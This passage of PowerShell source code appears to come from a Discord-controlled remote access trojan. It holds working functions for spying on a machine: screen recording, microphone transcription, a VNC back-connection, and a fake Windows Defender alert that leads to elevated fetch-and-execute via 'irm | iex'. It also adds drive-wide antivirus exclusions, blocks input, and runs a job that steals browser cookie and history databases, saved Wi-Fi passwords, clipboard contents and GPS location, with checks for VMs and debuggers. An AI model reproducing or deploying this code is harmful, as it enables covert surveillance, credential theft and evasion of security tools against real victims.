                $tempZipFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetFileName($Path))
                Add-Type -AssemblyName System.IO.Compression.FileSystem
                [System.IO.Compression.ZipFile]::CreateFromDirectory($Path, $tempZipFilePath)
                Send-File -FilePath $tempZipFilePath
                Start-Sleep -Seconds 1
                Remove-Item -Path $tempZipFilePath -Recurse -Force
            } else {
                Send-File -FilePath $Path
            }
        }
    } catch {
        Send-Message -Message ":octagonal_sign: ``File upload failed: $_`` :octagonal_sign:"
    }
}

function Speech-To-Text {
    try {
        Add-Type -AssemblyName System.Speech
        $speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine
        $grammar = New-Object System.Speech.Recognition.DictationGrammar
        $speech.LoadGrammar($grammar)
        $speech.SetInputToDefaultAudioDevice()
        while ($true) {
            $result = $speech.Recognize()
            if ($result) {
                $results = $result.Text
                Send-Message -Message "``````$results``````"
            }
            $messages = Pull-Message
            if ($messages -like "kill") {
                Send-Message -Message ":octagonal_sign: ``Speech-to-text stopped`` :octagonal_sign:"
                break
            }
        }
    } catch {
        Send-Message -Message ":octagonal_sign: ``Speech-to-text failed: $_`` :octagonal_sign:"
    }
}

function Start-UVNC {
    param ([string]$ip, [string]$port)
    try {
        Send-Message -Message ":arrows_counterclockwise: ``Starting UVNC Client..`` :arrows_counterclockwise:"
        $tempFolder = "$env:temp\vnc"
        $vncDownload = "https://github.com/wormserv/assets/raw/main/winvnc.zip"
        $vncZip = "$tempFolder\winvnc.zip"
        if (!(Test-Path -Path $tempFolder)) {
            New-Item -ItemType Directory -Path $tempFolder | Out-Null
        }
        if (!(Test-Path -Path $vncZip)) {
            Invoke-WebRequest -Uri $vncDownload -OutFile $vncZip
        }
        Start-Sleep -Seconds 1
        Expand-Archive -Path $vncZip -DestinationPath $tempFolder -Force
        Start-Sleep -Seconds 1
        Remove-Item -Path $vncZip -Force
        $proc = "$tempFolder\winvnc.exe"
        Start-Process $proc -ArgumentList "-run"
        Start-Sleep -Seconds 2
        Start-Process $proc -ArgumentList "-connect $ip::$port"
    } catch {
        Send-Message -Message ":octagonal_sign: ``UVNC start failed: $_`` :octagonal_sign:"
    }
}

function Record-Screen {
    param ([int[]]$t)
    try {
        $Path = "$env:Temp\ffmpeg.exe"
        if (!(Test-Path $Path)) { Get-Ffmpeg }
        if (!$t) { $t = 10 }
        Send-Message -Message ":arrows_counterclockwise: ``Recording screen for $t seconds..`` :arrows_counterclockwise:"
        $mkvPath = "$env:Temp\ScreenClip.mp4"
        & "$env:Temp\ffmpeg.exe" -f gdigrab -framerate 10 -t $t -i desktop -vcodec libx264 -preset fast -crf 18 -pix_fmt yuv420p -movflags +faststart $mkvPath
        Send-File -FilePath $mkvPath
        Start-Sleep -Seconds 5
        Remove-Item -Path $mkvPath -Force
    } catch {
        Send-Message -Message ":octagonal_sign: ``Screen recording failed: $_`` :octagonal_sign:"
    }
}

# Admin Functions
function Is-Admin {
    try {
        if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
            Send-Message -Message ":white_check_mark: ``You are Admin!`` :white_check_mark:"
        } else {
            Send-Message -Message ":octagonal_sign: ``Not Admin!`` :octagonal_sign:"
        }
    } catch {
        Send-Message -Message ":octagonal_sign: ``Admin check failed: $_`` :octagonal_sign:"
    }
}

function Elevate {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        Add-Type -AssemblyName Microsoft.VisualBasic
        [System.Windows.Forms.Application]::EnableVisualStyles()
        $errorForm = New-Object Windows.Forms.Form
        $errorForm.Width = 400
        $errorForm.Height = 180
        $errorForm.TopMost = $true
        $errorForm.StartPosition = 'CenterScreen'
        $errorForm.Text = 'Windows Defender Alert'
        $errorForm.Font = 'Microsoft Sans Serif,10'
        $errorForm.Icon = [System.Drawing.SystemIcons]::Information
        $errorForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
        $label = New-Object Windows.Forms.Label
        $label.AutoSize = $false
        $label.Width = 380
        $label.Height = 80
        $label.TextAlign = 'MiddleCenter'
        $label.Text = "Windows Defender has found critical vulnerabilities`n`nWindows will now attempt to apply important security updates to automatically fix these issues in the background"
        $label.Location = New-Object System.Drawing.Point(10, 10)
        $icon = [System.Drawing.Icon]::ExtractAssociatedIcon("C:\Windows\System32\UserAccountControlSettings.exe")
        $iconBitmap = $icon.ToBitmap()
        $resizedIcon = New-Object System.Drawing.Bitmap(16, 16)
        $graphics = [System.Drawing.Graphics]::FromImage($resizedIcon)
        $graphics.DrawImage($iconBitmap, 0, 0, 16, 16)
        $graphics.Dispose()
        $okButton = New-Object Windows.Forms.Button
        $okButton.Text = "  Apply Fix"
        $okButton.Width = 110
        $okButton.Height = 25
        $okButton.Location = New-Object System.Drawing.Point(185, 110)
        $okButton.Image = $resizedIcon
        $okButton.TextImageRelation = 'ImageBeforeText'
        $cancelButton = New-Object Windows.Forms.Button
        $cancelButton.Text = "Cancel "
        $cancelButton.Width = 80
        $cancelButton.Height = 25
        $cancelButton.Location = New-Object System.Drawing.Point(300, 110)
        $errorForm.controls.AddRange(@($label, $okButton, $cancelButton))
        $okButton.Add_Click({
            $errorForm.Close()
            $graphics.Dispose()
            $tobat = @"
Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
If Not WScript.Arguments.Named.Exists("elevate") Then
  CreateObject("Shell.Application").ShellExecute WScript.FullName, """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
  WScript.Quit
End If
WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$global:token'; irm $global:parent | iex", 0, True
"@
            $pth = "C:\Windows\Tasks\service.vbs"
            $tobat | Out-File -FilePath $pth -Force
            try {
                & $pth
                Start-Sleep -Seconds 7
                Remove-Item -Path $pth -Force
                Send-Message -Message ":white_check_mark: ``UAC Prompt sent to the current user..`` :white_check_mark:"
            } catch {
                Send-Message -Message ":octagonal_sign: ``UAC elevation failed: $_`` :octagonal_sign:"
            }
        })
        $cancelButton.Add_Click({ $errorForm.Close(); $graphics.Dispose() })
        [void]$errorForm.ShowDialog()
    } catch {
        Send-Message -Message ":octagonal_sign: ``Elevation failed: $_`` :octagonal_sign:"
    }
}

function Exclude-CDrive {
    try {
        Add-MpPreference -ExclusionPath C:\
        Send-Message -Message ":white_check_mark: ``C:/ Drive Excluded`` :white_check_mark:"
    } catch {
        Send-Message -Message ":octagonal_sign: ``C:/ exclusion failed: $_`` :octagonal_sign:"
    }
}

function Exclude-AllDrives {
    try {
        foreach ($drive in 'C', 'D', 'E', 'F', 'G') {
            Add-MpPreference -ExclusionPath "$drive:\"
        }
        Send-Message -Message ":white_check_mark: ``All Drives C:/ - G:/ Excluded`` :white_check_mark:"
    } catch {
        Send-Message -Message ":octagonal_sign: ``All drives exclusion failed: $_`` :octagonal_sign:"
    }
}

function Enable-IO {
    try {
        $signature = '[DllImport("user32.dll", SetLastError = true)][return: MarshalAs(UnmanagedType.Bool)]public static extern bool BlockInput(bool fBlockIt);'
        Add-Type -MemberDefinition $signature -Name User32 -Namespace Win32Functions
        [Win32Functions.User32]::BlockInput($false)
        Send-Message -Message ":white_check_mark: ``IO Enabled`` :white_check_mark:"
    } catch {
        Send-Message -Message ":octagonal_sign: ``Enable IO failed: $_`` :octagonal_sign:"
    }
}

function Disable-IO {
    try {
        $signature = '[DllImport("user32.dll", SetLastError = true)][return: MarshalAs(UnmanagedType.Bool)]public static extern bool BlockInput(bool fBlockIt);'
        Add-Type -MemberDefinition $signature -Name User32 -Namespace Win32Functions
        [Win32Functions.User32]::BlockInput($true)
        Send-Message -Message ":octagonal_sign: ``IO Disabled`` :octagonal_sign:"
    } catch {
        Send-Message -Message ":octagonal_sign: ``Disable IO failed: $_`` :octagonal_sign:"
    }
}

# Job Scriptblocks
$doLootJob = {
    param ([string]$token, [string]$LootID)
    function Browser-DB {
        try {
            Send-Message -Message ":arrows_counterclockwise: ``Getting Browser DB Files..`` :arrows_counterclockwise:" -ChannelID $LootID
            $temp = [System.IO.Path]::GetTempPath()
            $tempFolder = Join-Path -Path $temp -ChildPath 'dbfiles'
            $googledest = Join-Path -Path $tempFolder -ChildPath 'google'
            $mozdest = Join-Path -Path $tempFolder -ChildPath 'firefox'
            $edgedest = Join-Path -Path $tempFolder -ChildPath 'edge'
            New-Item -Path $tempFolder, $googledest, $mozdest, $edgedest -ItemType Directory -Force | Out-Null
            function Copy-Files {
                param ([string]$dbfile, [string]$folder, [switch]$db)
                $filesToCopy = Get-ChildItem -Path $dbfile -Filter '*' -Recurse | Where-Object { $_.Name -like 'Web Data' -or $_.Name -like 'History' -or $_.Name -like 'formhistory.sqlite' -or $_.Name -like 'places.sqlite' -or $_.Name -like 'cookies.sqlite' }
                foreach ($file in $filesToCopy) {
                    $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object { [char]$_ })
                    $newFileName = if ($db) { $file.BaseName + "_" + $randomLetters + $file.Extension + '.db' } else { $file.BaseName + "_" + $randomLetters + $file.Extension }
                    $destination = Join-Path -Path $folder -ChildPath $newFileName
                    Copy-Item -Path $file.FullName -Destination $destination -Force
                }
            }
            $googleDir = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
            $firefoxDir = (Get-ChildItem -Path "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles" -Directory | Where-Object { $_.Name -like '*.default-release' }).FullName
            $edgeDir = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data"
            Copy-Files -dbfile $googleDir -folder $googledest -db
            Copy-Files -dbfile $firefoxDir -folder $mozdest
            Copy-Files -dbfile $edgeDir -folder $edgedest -db
            $zipFileName = [System.IO.Path]::Combine($temp, "dbfiles.zip")
            Compress-Archive -Path $tempFolder -DestinationPath $zipFileName
            Remove-Item -Path $tempFolder -Recurse -Force
            Send-File -FilePath $zipFileName -ChannelID $LootID
            Start-Sleep -Seconds 1
            Remove-Item -Path $zipFileName -Recurse -Force
        } catch {
            Send-Message -Message ":octagonal_sign: ``Browser DB collection failed: $_`` :octagonal_sign:" -ChannelID $LootID
        }
    }

    function System-Info {
        try {
            Send-Message -Message ":computer: ``Gathering System Information for $env:COMPUTERNAME`` :computer:" -ChannelID $LootID
            Add-Type -AssemblyName System.Windows.Forms
            # User Information
            $userInfo = Get-WmiObject -Class Win32_UserAccount
            $fullName = ($userInfo.FullName | Where-Object { $_ }) -join ", "
            $email = (Get-ComputerInfo).WindowsRegisteredOwner
            $users = ($userInfo.Name | Where-Object { $_ }) -join ", "
            $systemLanguage = (Get-WinSystemLocale).Name
            $keyboardLayoutID = (Get-WinUserLanguageList)[0].InputMethodTips[0]
            # OS Information
            $systemInfo = Get-WmiObject -Class Win32_OperatingSystem
            $OSString = "$($systemInfo.Caption)"
            $WinVersion = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
            $OSArch = "$($systemInfo.OSArchitecture)"
            $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
            $screensize = "$($Screen.Width) x $($Screen.Height)"
            # Activation Date
            function Convert-BytesToDatetime([byte[]]$b) {
                [long]$f = ([long]$b[7] -shl 56) -bor ([long]$b[6] -shl 48) -bor ([long]$b[5] -shl 40) -bor ([long]$b[4] -shl 32) -bor ([long]$b[3] -shl 24) -bor ([long]$b[2] -shl 16) -bor ([long]$b[1] -shl 8) -bor [long]$b[0]
                [datetime]::FromFileTime($f)
            }
            $RegKey = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\ProductOptions").ProductPolicy
            $totalSize = ([System.BitConverter]::ToUInt32($RegKey, 0))
            $value = 0x14
            $activated = $null
            while ($true) {
                $keySize = ([System.BitConverter]::ToUInt16($RegKey, $value))
                $keyNameSize = ([System.BitConverter]::ToUInt16($RegKey, $value + 2))
                $keyDataSize = ([System.BitConverter]::ToUInt16($RegKey, $value + 6))
                $keyName = [System.Text.Encoding]::Unicode.GetString($RegKey[($value + 0x10)..($value + 0x0F + $keyNameSize)])
                if ($keyName -eq 'Security-SPP-LastWindowsActivationTime') {
                    $activated = Convert-BytesToDatetime($RegKey[($value + 0x10 + $keyNameSize)..($value + 0x0F + $keyNameSize + $keyDataSize)])
                }
                $value += $keySize
                if (($value + 4) -ge $totalSize) { break }
            }
            # GPS Location
            Add-Type -AssemblyName System.Device
            $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
            $GeoWatcher.Start()
            while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) { Start-Sleep -Milliseconds 100 }
            $GPS = if ($GeoWatcher.Permission -eq 'Denied') { "Location Services Off" } else {
                $GL = $GeoWatcher.Position.Location | Select-Object Latitude, Longitude
                $GL = $GL -split " "
                $Lat = $GL[0].Substring(11) -replace ".$"
                $Lon = $GL[1].Substring(10) -replace ".$"
                "LAT = $Lat LONG = $Lon"
            }
            # Hardware Information
            $processor = (Get-WmiObject -Class Win32_Processor).Name
            $gpu = (Get-WmiObject Win32_VideoController).Name
            $RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB) }
            $computerSystemInfo = (Get-WmiObject -Class Win32_ComputerSystem | Out-String).Trim()
            # HDD Information
            $HddInfo = Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, VolumeName, FileSystem, @{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-List | Out-String
            $DiskHealth = Get-PhysicalDisk | Select-Object FriendlyName, OperationalStatus, HealthStatus | Format-List | Out-String
            # System Metrics
            function Get-PerformanceMetrics {
                $cpuUsage = Get-Counter '\Processor(_Total)\% Processor Time' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
                $memoryUsage = Get-Counter '\Memory\% Committed Bytes In Use' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
                $diskIO = Get-Counter '\PhysicalDisk(_Total)\Disk Transfers/sec' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
                $networkIO = Get-Counter '\Network Interface(*)\Bytes Total/sec' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
                return [PSCustomObject]@{
                    CPUUsage = "{0:F2}" -f $cpuUsage.CookedValue
                    MemoryUsage = "{0:F2}" -f $memoryUsage.CookedValue
                    DiskIO = "{0:F2}" -f $diskIO.CookedValue
                    NetworkIO = "{0:F2}" -f $networkIO.CookedValue
                }
            }
            $metrics = Get-PerformanceMetrics
            $PMcpu = "CPU Usage: $($metrics.CPUUsage)%"
            $PMmu = "Memory Usage: $($metrics.MemoryUsage)%"
            $PMdio = "Disk I/O: $($metrics.DiskIO) transfers/sec"
            $PMnio = "Network I/O: $($metrics.NetworkIO) bytes/sec"
            # Anti-Virus Info
            $AVinfo = (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName | Out-String).Trim()
            # Network Information
            $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
            $localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object SuffixOrigin -eq "Dhcp" | Select-Object -ExpandProperty IPAddress)
            if ($localIP -match '^(\d{1,3}\.\d{1,3}\.\d{1,3})\.\d{1,3}$') {
                $subnet = $matches[1]
                1..254 | ForEach-Object { Start-Process -WindowStyle Hidden ping.exe -ArgumentList "-n 1 -l 0 -f -i 2 -w 100 -4 $subnet.$_" }
                $Computers = (arp.exe -a | Select-String "$subnet.*dynam") -replace ' +',',' | ConvertFrom-Csv -Header Computername,IPv4,MAC | Where-Object { $_.MAC -ne 'dynamic' } | Select-Object IPv4, MAC, Computername
                $scanresult = ""
                $Computers | ForEach-Object {
                    try {
                        $ip = $_.IPv4
                        $hostname = ([System.Net.Dns]::GetHostEntry($ip)).HostName
                        $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value $hostname -Force
                    } catch {
                        $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value "Error: $($_.Exception.Message)" -Force
                    }
                    $scanresult += "IP Address: $($_.IPv4) `nMAC Address: $($_.MAC) `n"
                    if ($_.Hostname) { $scanresult += "Hostname: $($_.Hostname) `n" }
                    $scanresult += "`n"
                }
            }
            $outssid = $null
            $a = 0
            $ws = (netsh wlan show profiles) -replace ".*:\s+"
            foreach ($s in $ws) {
                if ($a -gt 1 -and $s -notmatch " policy " -and $s -ne "User profiles" -and $s -notmatch "-----" -and $s -notmatch "<None>" -and $s.length -gt 5) {
                    $ssid = $s.Trim()
                    if ($s -match ":") { $ssid = $s.Split(":")[1].Trim() }
                    $pw = netsh wlan show profiles name=$ssid key=clear
                    $pass = "None"
                    foreach ($p in $pw) {
                        if ($p -match "Key Content") { $pass = $p.Split(":")[1].Trim() }
                        $outssid += "SSID: $ssid | Password: $pass`n"
                    }
                }
                $a++
            }
            $NearbyWifi = (netsh wlan show networks mode=Bssid | Where-Object { $_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*" }).trim() | Format-Table SSID, Signal, Band | Out-String
            # VM Detection
            $isVM = $false
            $isDebug = $false
            $screen = [System.Windows.Forms.Screen]::PrimaryScreen
            $Width = $screen.Bounds.Width
            $Height = $screen.Bounds.Height
            $networkAdapters = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -ne $null }
            $services = Get-Service
            $vmServices = @('vmtools', 'vmmouse', 'vmhgfs', 'vmci', 'VBoxService', 'VBoxSF')
            $manufacturer = (Get-WmiObject Win32_ComputerSystem).Manufacturer
            $vmManufacturers = @('Microsoft Corporation', 'VMware, Inc.', 'Xen', 'innotek GmbH', 'QEMU')
            $model = (Get-WmiObject Win32_ComputerSystem).Model
            $vmModels = @('Virtual Machine', 'VirtualBox', 'KVM', 'Bochs')
            $bios = (Get-WmiObject Win32_BIOS).Manufacturer
            $vmBios = @('Phoenix Technologies LTD', 'innotek GmbH', 'Xen', 'SeaBIOS')
            $vmChecks = @{
                "VMwareTools" = "HKLM:\SOFTWARE\VMware, Inc.\VMware Tools"
                "VMwareMouseDriver" = "C:\WINDOWS\system32\drivers\vmmouse.sys"
                "VMwareSharedFoldersDriver" = "C:\WINDOWS\system32\drivers\vmhgfs.sys"
                "SystemBiosVersion" = "HKLM:\HARDWARE\Description\System\SystemBiosVersion"
                "VBoxGuestAdditions" = "HKLM:\SOFTWARE\Oracle\VirtualBox Guest Additions"
                "VideoBiosVersion" = "HKLM:\HARDWARE\Description\System\VideoBiosVersion"
                "VBoxDSDT" = "HKLM:\HARDWARE\ACPI\DSDT\VBOX__"
                "VBoxFADT" = "HKLM:\HARDWARE\ACPI\FADT\VBOX__"
                "VBoxRSDT" = "HKLM:\HARDWARE\ACPI\RSDT\VBOX__"
                "SystemBiosDate" = "HKLM:\HARDWARE\Description\System\SystemBiosDate"
            }
            $taskManagers = @("taskmgr", "procmon", "procmon64", "procexp", "procexp64", "perfmon", "perfmon64", "resmon", "resmon64", "ProcessHacker")
            $commonResolutions = @("1280x720", "1280x800", "1280x1024", "1366x768", "1440x900", "1600x900", "1680x1050", "1920x1080", "1920x1200", "2560x1440", "3840x2160")
            $currentResolution = "$Width`x$Height"
            $rescheck = if ($commonResolutions -contains $currentResolution) { "Resolution Check : PASS" } else { "Resolution Check : FAIL" }
            $ManufaturerCheck = if ($vmManufacturers -contains $manufacturer) { "Manufacturer Check : FAIL" } else { "Manufacturer Check : PASS" }
            $ModelCheck = if ($vmModels -contains $model) { "Model Check : FAIL" } else { "Model Check : PASS" }
            $BiosCheck = if ($vmBios -contains $bios) { "Bios Check : FAIL" } else { "Bios Check : PASS" }
            foreach ($service in $vmServices) { if ($services -match $service) { $isVM = $true } }
            foreach ($check in $vmChecks.GetEnumerator()) { if (Test-Path $check.Value) { $isVM = $true } }
            foreach ($adapter in $networkAdapters) {
                $macAddress = $adapter.MACAddress -replace ":", ""
                if ($macAddress.StartsWith("080027") -or $macAddress.StartsWith("000569") -or $macAddress.StartsWith("000C29") -or $macAddress.StartsWith("001C14")) { $isVM = $true }
            }
            Add-Type @"
using System;
using System.Runtime.InteropServices;
public class DebuggerCheck {
    [DllImport("kernel32.dll")]
    public static extern bool IsDebuggerPresent();
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
}
"@
            $isDebuggerPresent = [DebuggerCheck]::IsDebuggerPresent()
            $isRemoteDebuggerPresent = $false
            [DebuggerCheck]::CheckRemoteDebuggerPresent([System.Diagnostics.Process]::GetCurrentProcess().Handle, [ref]$isRemoteDebuggerPresent) | Out-Null
            if ($isDebuggerPresent -or $isRemoteDebuggerPresent) { $isDebug = $true }
            $vmDetect = "VM Check : " + (if ($isVM) { "FAIL!" } else { "PASS" })
            $debugDetect = "Debugging Check : " + (if ($isDebug) { "FAIL!" } else { "PASS" })
            $runningTaskManagers = @()
            foreach ($taskManager in $taskManagers) {
                if (Get-Process -Name $taskManager -ErrorAction SilentlyContinue) { $runningTaskManagers += $taskManager }
            }
            $runningTaskManagers = if ($runningTaskManagers) { $runningTaskManagers -join ", " } else { "None Found.." }
            $clipboard = Get-Clipboard
            $clipboard = if ($clipboard) { $clipboard } else { "No Data Found.." }
            # Browser History
            $Expression = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
            $Paths = @{
                'chrome_history' = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
                'chrome_bookmarks' = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
                'edge_history' = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
                'edge_bookmarks' = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
                'firefox_history' = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
                'opera_history' = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
                'opera_bookmarks' = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
            }
            $outpath = "$env:temp\Browsers.txt"
            $Browsers = @('chrome', 'edge', 'firefox', 'opera')
            $DataValues = @('history', 'bookmarks')
            foreach ($Browser in $Browsers) {
                foreach ($DataValue in $DataValues) {
                    $PathKey = "${Browser}_${DataValue}"
                    $Path = $Paths[$PathKey]
                    $entry = Get-Content -Path $Path -ErrorAction SilentlyContinue | Select-String -AllMatches $Expression | % { ($_.Matches).Value } | Sort-Object -Unique
                    $entry | ForEach-Object {
                        [PSCustomObject]@{
                            Browser = $Browser
                            DataType = $DataValue
                            Content = $_
                        }
                    } | Out-File -FilePath $outpath -Append
                }
            }
            $entry = (Get-Content -Path $outpath -ErrorAction SilentlyContinue | Out-String).Trim()
            # System Information
            $usbdevices = (Get-WmiObject Win32_USBControllerDevice | ForEach-Object { [Wmi]($_.Dependent) } | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table | Out-String).Trim()
            $process = (Get-WmiObject win32_process | Select-Object Handle, ProcessName, ExecutablePath | Out-String).Trim()
            $service = (Get-CimInstance -ClassName Win32_Service | Select-Object State, Name, StartName, PathName | Where-Object { $_.State -like 'Running' } | Out-String).Trim()
            $software = (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize | Out-String).Trim()
            $global:jsonPayload = @{
                username = $env:COMPUTERNAME
                tts = $false
                embeds = @(
                    @{
                        title = "$env:COMPUTERNAME | Detailed System Information"
                        description = @"
:man_detective: **User Information** :man_detective:
- **Full Name**        : ``$fullName``
- **Users**            : ``$users``
- **Email**            : ``$email``
- **System Language**  : ``$systemLanguage``
- **Keyboard Layout**  : ``$keyboardLayoutID``

:minidisc: **OS Information** :minidisc:
- **Operating System** : ``$OSString - $WinVersion``
- **Architecture**     : ``$OSArch``
- **Screen Size**      : ``$screensize``
- **Activated**        : ``$activated``

:desktop: **Hardware Information** :desktop:
- **Processor**        : ``$processor``
- **GPU**              : ``$gpu``
- **Memory**           : ``$RamInfo``
- **HDD Info**         : ``$HddInfo``
- **Disk Health**      : ``$DiskHealth``

:bar_chart: **System Metrics** :bar_chart:
- **$PMcpu**
- **$PMmu**
- **$PMdio**
- **$PMnio**

:globe_with_meridians: **Network Information** :globe_with_meridians:
- **Public IP**        : ``$computerPubIP``
- **Local IP**         : ``$localIP``
- **GPS Location**     : ``$GPS``
- **LAN Devices**      : ``$scanresult``
- **Saved WiFi**       : ``$outssid``
- **Nearby WiFi**      : ``$NearbyWifi``

:shield: **Security Information** :shield:
- **Anti-Virus**       : ``$AVinfo``
- **$rescheck**
- **$ManufaturerCheck**
- **$ModelCheck**
- **$BiosCheck**
- **$vmDetect**
- **$debugDetect**
- **Task Managers**    : ``$runningTaskManagers``

:open_file_folder: **Data Information** :open_file_folder:
- **Clipboard**        : ``$clipboard``
- **Browser Data**     : ``$entry``
"@
                        color = 65280
                    },
                    @{
                        title = "System Processes"
                        description = "``````$process``````"
                        color = 65280
                    },
                    @{
                        title = "System Services"
                        description = "``````$service``````"
                        color = 65280
                    },
                    @{
                        title = "USB Devices"
                        description = "``````$usbdevices``````"
                        color = 65280
                    },
                    @{
                        title = "Software"
                        description = "``````$software``````"
                        color = 65280
                    },
                    @{
                        title = "System Information"
                        description = "``````$computerSystemInfo``````"
                        color = 65280
                    }
                )
            }
            Send-Message -ChannelID $LootID -Embed $true
            Remove-Item -Path $outpath -Force -ErrorAction SilentlyContinue
        } catch {
            Send-Message -Message ":octagonal_sign: ``System Info collection failed: $_`` :octagonal_sign:" -ChannelID $LootID
        }
    }
    Browser-DB
    System-Info
}
